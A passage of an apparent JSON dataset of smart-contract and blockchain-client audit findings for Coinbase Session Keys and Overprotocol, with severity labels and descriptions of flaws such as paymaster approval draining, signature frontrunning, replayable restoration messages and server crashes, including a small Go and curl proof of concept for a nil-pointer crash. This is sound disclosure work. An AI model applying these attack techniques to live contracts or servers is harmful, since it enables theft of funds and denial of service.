15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Permissions can drain approvals given to certain paymasters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The Smart Wallet Permissions system requires all user operations utilize an allowlisted paymaster. This is because without this requirement, a permission could arbitrarily use the Smart Wallets ETH for gas fees, which would increase the trust needed for each permission. Currently, paymaster allowlisting is enforced via the isPaymasterEnabled mapping, which is checked in the be- foreCalls() function: function beforeCalls(Permission calldata permission, address paymaster, address userOpCosigner) external whenNotPaused { } //... if (!isPaymasterEnabled[paymaster]) revert DisabledPaymaster(paymaster); // ... Note that the beforeCalls() function is invoked during the execution phase of the user operation, which implies a non-allowlisted paymaster can successfully pass the validateUserOp() step of the ERC-4337 transaction. This poses a problem, because some paymasters are authorized to debit the account as long as the validation phase succeeds. For example, some ERC20 paymasters are designed to withdraw ERC20 tokens from the account in exchange for covering transaction fees. These paymasters will always charge the account if the validation phase succeeds, regardless of whether the execution phase is successful. As a result, if an account has pre-approved a paymaster outside of the Smart Wallet Permissions system, any of its permissions could potentially drain the pre-approved balance. This would be achieved by using the paymaster during the validation phase, even though it will fail the beforeCalls() step later. Since the paymaster would still charge the user, and since the permission could set excessively high gas costs, the accounts balance that it has pre-approved could be drained quickly. Note that this behavior is not preventable by the cosigner, since the cosigner check is also in the execution phase.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No user-control on what selector is called on an external contract allowed under a session key",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The validatePermission() function only checks that the primary selector is permissionedCall() (as the overall call is wrapped with this selector before sending the userOp), but there are no user-level controls on what selector is actually going to be called on the allowedContract. The external contract having permissionedCall is a system-wide requirement (for the current permission contract) but the user has no say in what function gets called inside the permissionedCall() [ie. the self-delegatecall part]. So, a session key might convince a smart account to sign a permission to call allowedContract by telling them that they are going to call only function A, but there can be a problem if there are multiple functions in the allowed- Contract that have different capabilities. For example, if the user believes the session key will only be allowed to stake ETH, but it actually sends a trans- action encoding a call to lend ETH, the call will go through. If the user is not aware of this behavior, they may be surprised by this. This is possible if the allowedContract supports multiple selectors under permissionedCall().",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "MagicSpend.withdraw() calls are exposed to frontrun attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The protocol supports the magicSpend.withdraw() permission call. } else if (selector == MagicSpend.withdraw.selector) { // check call target is MagicSpend if (call.target != magicSpend) revert CallErrors.TargetNotAllowed(call.target); // parse MagicSpend withdraw request MagicSpend.WithdrawRequest memory withdraw = abi.decode(BytesLib.trimSelector(calls[i].data), (MagicSpend.WithdrawRequest)); // check withdraw is native token if (withdraw.asset != address(0)) revert InvalidWithdrawAsset(withdraw.asset); magicSpend.withdraw() call needs to include signature in the WithdrawRequest param and the signature will be consumed. For a given signature, as long as the call is sent from the same smart wallet, the call is valid. 5 function withdraw(WithdrawRequest memory withdrawRequest) external { if (block.timestamp > withdrawRequest.expiry) { revert Expired(); } if (!isValidWithdrawSignature(msg.sender, withdrawRequest)) { revert InvalidSignature(); } _validateRequest(msg.sender, withdrawRequest); // ... function _validateRequest(address account, WithdrawRequest memory withdrawRequest) internal { if (_nonceUsed[withdrawRequest.nonce][account]) { revert InvalidNonce(withdrawRequest.nonce); } uint256 maxAllowed = address(this).balance / maxWithdrawDenominator; if (withdrawRequest.asset == address(0) && withdrawRequest.amount > maxAllowed) { revert WithdrawTooLarge(withdrawRequest.amount, maxAllowed); } _nonceUsed[withdrawRequest.nonce][account] = true; When the user approves Apps, App's permission calls are sent from that user's smart wallet, and when one App's permission calls include MagicSpend.withdraw(), the signature in the WithdrawRequest param is public, which give other App's permission calls the opportunity to include that MagicSpend.withdraw() call. Consider the following case: 1. The user approves App1 and App2, App2 does not spend any funds, App1 needs some funds initially, so the user provides a MagicSpend signature to allow App1 to withdraw the funds. 2. App1 constructs the user operation A, which wants to call magicSpend.withdraw() to withdraw funds and perform subsequent spend calls. 3. The misbehaving App2 constructs the user operation B, which includes the magicSpend.withdraw() call with the signature from user operation A. 4. User operation B is packaged by the Bundlers earlier, so that user operation A fails and the withdrawn funds remain in the smart wallet instead of being spent. 5. And worse, if App2 is approved to spend funds but has no funds in the smart wallet, App2 may spend those withdrawn funds instead of App1.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "bytes4 casting can be unsafe",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "There are three locations in the codebase where bytes values representing calldata are typecast to bytes4 to determine the function selector of a call. These locations are: 1. The isValidSignature() function within the PermissionManager contract: if (bytes4(data.userOp.callData) != CoinbaseSmartWallet.executeBatch.selector) { revert CallErrors.SelectorNotAllowed(bytes4(data.userOp.callData)); } 2. The validatePermission() function within the PermissionCallableAllowedContractNativeTokenRecur- ringAllowance contract: bytes4 selector = bytes4(call.data); if (selector == IPermissionCallable.permissionedCall.selector) { // ... } else if (selector == MagicSpend.withdraw.selector) { // ... } else { revert CallErrors.SelectorNotAllowed(selector); } 3. The permissionedCall() function within the PermissionCallable contract: if (call.length < 4) revert InvalidCallLength(); if (!supportsPermissionedCallSelector(bytes4(call))) revert NotPermissionCallable(bytes4(call)); In general, note that the conversion of a bytes value shorter than 4 bytes into a bytes4 value will not revert, and will instead add extra zero bytes as padding. For example, consider the following test case: // SPDX-License-Identifier: MIT pragma solidity ^0.8.23; import {Test} from \"forge-std/Test.sol\"; contract Bytes4Casting is Test { function test_bytes4_casting() public pure { bytes memory data = hex\"112233\"; bytes4 sig = 0x11223300; assertEq(data.length, 3); assertEq(bytes4(data), sig); } } This behavior is not a concern in location (3) above, due to the explicit length check. In location (1), the bytes are later decoded in a way that will revert if shorter than 4 bytes, which also mitigates any risk. However, in location (2), there is technically nothing preventing the bytes value from being less than 4 bytes in length. If either IPermissionCallable.permissionedCall.selector or MagicSpend.withdraw.selector had trailing zero bytes, it's possible that a shortened bytes value could be implicitly padded and would match the overall selector. This would introduce other concerns since when the call executes later on, it would reach the contract's fallback function instead of the function that was expected. Fortunately, Magic- Spend.withdraw.selector is 0xd833cae, so there are no trailing zeroes and this is not an issue. However, to be safer, this behavior could be eliminated entirely IPermissionCallable.permissionedCall.selector 0x2bd1b86d and is 7",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cosigner signatures are not revocable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "Cosigner signatures are not revocable. In the event of a delay before a transaction is included in a block, and new information surfaces such as a contract upgrade, a revocation may be desirable.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cosigner event exclusions are limited",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The cosigner signing is handed by a backend service monitoring for unintended transactions that may move value away from a Smart Wallet account. In the project briefing and documentation, Coinbase notes that simulations will look for logs matching ERC20/ERC721/ERC1155 transfer logs where the from argument is the user s address (userOp.sender); similarly for approvals.  There may be value transfer events not covered with the cosigner relying on Transfer/Approve events for its veto. Examples include an orderbook already approved by the Smart Wallet, session keys can create unfavorable orders. Other admin functions like Ownable2Step won't emit Transfer/Approve events but are not likely to be desirable calls from a permissioned signer.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "lastCycleExists can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "Checking that start != 0 is enough to determine if the last cycle existed. In case that start > 0, the end will automatically be initialized as a non-zero value(using start value) as seen in the else branch here. If spend == 0 or spend > 0 also does not impact the logic of determining if a last cycle existed. This is because the cycle is only cached in storage if the spend value is non-zero.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Informational"
        ]
    },
    {
        "title": "Documentation errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The code comments are wrong at some places: 1. Wrong comment for event RecurringAllowanceInitialized(). Should be ) Register native token al- lowance for a permission. 2. Wrong comment for _getCurrentCycleUsage() function. Should be ) n*recurringAllowance.period - 1. 3. Wrong comment for validatePermission() function. Should be ) Offchain userOp construction should append useRecurringAllowance call to calls array. 4. Wrong comment for revokePermission() function. Remove it. 5. Confusing comment for setPaymasterEnabled() function. Remove it as the intention is to ban no-paymaster ops at the manager level. For more consistency, also add a check that address(0) can't be enabled as a paymaster here. 6. Wrong comment for isValidSignature() function. Should be ) Verifies that userOp.calldata calls CoinbaseSmartWallet.executeBatch.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Informational NativeTokenRecurringAllowance.sol#L181,"
        ]
    },
    {
        "title": "getRequiredPrefund() can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The UserOperationLib implements the getRequiredPrefund() function, however this function is not used in the current version of the codebase.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Informational"
        ]
    },
    {
        "title": "beforeCalls() and useRecurringAllowance() payable considerations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "The beforeCalls() and useRecurringAllowance() functions must be called in a specific manner during the execution phase, which is enforced by checks in the validation phase. The beforeCalls() check is implemented as follows: // check first call is valid if (calls[0].target != address(this) || !BytesLib.eq(calls[0].data, beforeCallsData)) { self.beforeCalls   revert InvalidBeforeCallsCall(); } The useRecurringAllowance() check is implemented similarly: 10 // check last call is valid CoinbaseSmartWallet.Call memory lastCall = calls[callsLen - 1]; if (lastCall.target != address(this) || !BytesLib.eq(lastCall.data, useRecurringAllowanceData)) { this.useRecurringAllowance   revert InvalidUseRecurringAllowanceCall(); } Notice that neither check enforces that the ETH value of the call is 0. This makes it crucial that neither before- Calls() nor useRecurringAllowance() are defined as payable functions. Otherwise, ETH could be transferred by permissions in an untracked manner. Fortunately, both beforeCalls() and useRecurringAllowance() are indeed not defined as payable, so there is no issue.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Informational"
        ]
    },
    {
        "title": "Permissions cannot be un-revoked and must be recreated with modified Permission",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "Permission revocation cannot be undone. Not a problem for currently supported permissions as the start time can be changed to re-enable. For future permissions, users attempting to re-enable an identical permission to a previously revoked one will need to select a new expiry timestamp to produce a unique permissionHash.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Informational"
        ]
    },
    {
        "title": "CoinbaseSmartWallet and similar contract accounts cannot be a permission signer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Coinbase-Session-Keys-Spearbit-Security-Review-September-2024.pdf",
        "body": "permission.signer cannot be a standard CoinbaseSmartWallet as its own storage is not keyed by the user address. No issue identified as simulation will fail and the transaction would be dropped by the bundler.",
        "labels": [
            "Spearbit",
            "Coinbase-Session-Keys",
            "Severity: Informational"
        ]
    },
    {
        "title": "Malicious Restoration Servers can replay RestoreData messages and drain accounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The RestoreData struct does not have a nonce and is not rooted to the first RestorationTX that uses it in any way. There is also nothing in the EVM that prevents successfully processing a RestorationTX for a non-dormant account. These factors contribute to a situation that allows for malicious restoration servers to make as many RestorationTX transactions as is needed to drain the account of any user that makes a requestRestora- tion API call.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Prefunded contracts can permanently lose funds if account becomes dormant before code is de- ployed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "Contracts that receive funds before they are deployed can permanently lose the funds if the account goes dormant before the contract is deployed. It is not an uncommon pattern for people to prefund contracts whose addresses are known ahead of time (via CREATE2). The issue is that once the contract is deployed there is no way for a restorationTX to restore the account because of the common.BytesToHash(account.CodeHash) != types.EmptyCodeHash check in (evm *EVM) verifyRestorationProof(). If a restorationTX is made on behalf of the contract's address before it is deployed then the funds will be saved. If any funds are dormant and are not restored prior to the contract deployment then they will be forever lost.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Malicious request could burn restoration server gas fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The GetRestorationProof function does not check if it is creating a proof for a contract address, while the Restore transaction will fail to verifyRestorationProof if Target is a contract address. Without this check, a malicious actor could request restorations for a contract address that the restoration server recognizes as valid, since GetRestorationProof would return a valid restoration proof without checking if it's a contract. The restoration server would then send Restore transactions to the EVM which would inevitably fail due to the Target being a contract. This would result in the restoration server losing its gas fees without any reprecussions to the original requester. This would result in a scenario where a malicious actor could forcibly burn the entire balance on any restoration server.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Malicious request can crash the restoration server",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "An attacker can send a request to a restoration server with a nil Fee which causes it to panic via nil dereference. We believe the authors were working under the assumption that the gencodec:\"required\" struct tags would ensure required fields are non-nil, but this does not apply to JSON deserialization. Here's a simple proof of concept: package main import ( \"fmt\" \"github.com/gofiber/fiber/v2\" \"math/big\" ) type Foo struct { Fee *big.Int }  json:\"fee\" gencodec:\"required\"  func main() { app := fiber.New() app.Post(\"/foo\", func(ctx *fiber.Ctx) error { foo := new(Foo) if err := ctx.BodyParser(foo); err != nil { return ctx.Status(400).SendString(err.Error()) } ret := fmt.Sprintf(\"foo.Fee is %v\", foo.Fee) return ctx.Status(200).SendString(ret) }) fmt.Println(app.Listen(\":3001\")) } A request with a null fee shows that the value can be nil: $ curl -X POST \\ http://localhost:3001/foo \\ -H -d Content-Type: application/json {\"fee\": null}     \\ foo.Fee is <nil>% This matters because when you pass Fee to Cmp, it will panic if Fee is nil. func TestCmpWithNil(t *testing.T) { big.NewInt(64).Cmp(nil) } This test will panic with the following output: TestCmpWithNil === RUN --- FAIL: TestCmpWithNil (0.00s) panic: runtime error: invalid memory address or nil pointer dereference [recovered] panic: runtime error: invalid memory address or nil pointer dereference [signal SIGSEGV: segmentation violation code=0x2 addr=0x0 pc=0x1044cf52c]",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "EVM.Restore() gas not consumed on invalid signature",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "(evm *EVM) Restore() does not consume all gas on RestoreData signatures. An attacker can generate incredibly large restorationTXs that will consume the nodes resources validating the restoration server's signature on a large data buffer (eg input/proof). If the RestoreData signature fails then the cost of this large verification will only be the intrinsic gas as the memory cost calculation will never be hit. This will allow for a chain-wide DOS vector that costs almost no gas to implement.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Restoration Server result.RestoredBalance nil pointer dereference DoS",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The restoration server is vulnerable to a nil pointer dereference panic (panic: runtime er- ror: invalid memory address or nil pointer dereference) if its gethclient returns a null json for restora- tionProofResult.RestoredBalance. This will cause a DOS in the restoration server. While the ideal situation is that every restoration server also runs its own gethclient the restoration server does allow remote connections for this service.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "eth_getRestorationProof API exposure possible DoS vector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The eth_getRestorationProof API can be computationally intensive. There is no way to prevent queries that set the TargetEpoch to 0 as this may be valid in some settings. The longer the chain is around the more work responding to a query like this will take. This introduces a DoS vector for public RPC servers as long as they cannot turn of this API when providing regular eth APIs.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ChainID should not be 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "There are references in the codebase to Ethereum related bootnode ENRs as well as chainID defaults that are equal to Ethereum mainnet and various testnets.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Enforce EpochLimit value minimum size of 3 on chain creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "Each checkpoint block, the chain does through and deletes epochs based on the configured EpochLimit. Any value lower than 3 could delete required data.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Mistake in ENR key for discovery",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "This function will return \"over1\" when it should return \"over\".",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Gas checks in Restore should be performed as soon as possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "Gas checks should be done as soon as possible to avoid unnecessary work. There are some operations, like a signature validation, prior to the gas checks. Additionally, if there were an error in these prior checks, it wouldn't cost the caller anything.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "eth_getRestorationProof will return empty proof",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "If a TargetEpoch is provided to the eth_getRestorationProof that is above the previous Restore- dEpcoh then the API will return an empty proof instead of erroring. This is not be caught in the restoration server logic or in the EVM processing of the RestorationTX. This will result in a waste of gas for the restoration server and the user requesting restoration.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong values are logged if ckptRoot != ckptDiskRoot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "This checks if ckptRoot matches ckptDiskRoot. If they don't match it logs root and diskRoot.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Value checks in journal should happen after each read",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "In the loadJournal function, there are consecutive Decode's from the rlp Stream followed by con- secutive checks that the values are correct. While the rlp Stream likely has the data buffered from disk, it is good practice to check those values after each read. This will catch failures quickly and prevent any more reads than necessary.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Namespace overriding of keystore package",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The keystore.NewKeyStore value is assigned to variable keystore. This assignment overrides the keystore package namespace in the main function. This will result in being unable to use the keystore package in the future and may result in unexpected behavior if attempting to do so.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Nil value on initialization needs comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "On initialization in the New function, if currentEpoch == 0, then the ckptTrie value will remain nil. This value is correctly checked for nil values everywhere it is used, but there is nothing indicating that this value could be nil.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused function isStale can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The function isStale for ckptDiskLayer is never used, and it isn't required for implementing the layer interface.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Slightly misleading documentation for SafeSub32",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The comment above the function says that it checks for an \"overflow\" when it should say \"underflow\".",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "EpochLength could be confused with SweepEpoch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "EpochLength (size of an epoch value, uint32) could be confused with SweepEpoch (number of blocks in an epoch).",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused parameters in checkProfitable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The checkProfitable helper function does not use ctx or ethclient.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function unnecessarily returns an error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "The ProofDB::Put function returns an error, but it will always be nil.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Exported function with an unexported return type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-vCISO-May-2024.pdf",
        "body": "NewAlpacaRestoreDataSigner returns an instance of the alpacaRestoreDataSigner struct, which is not exported.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    }
]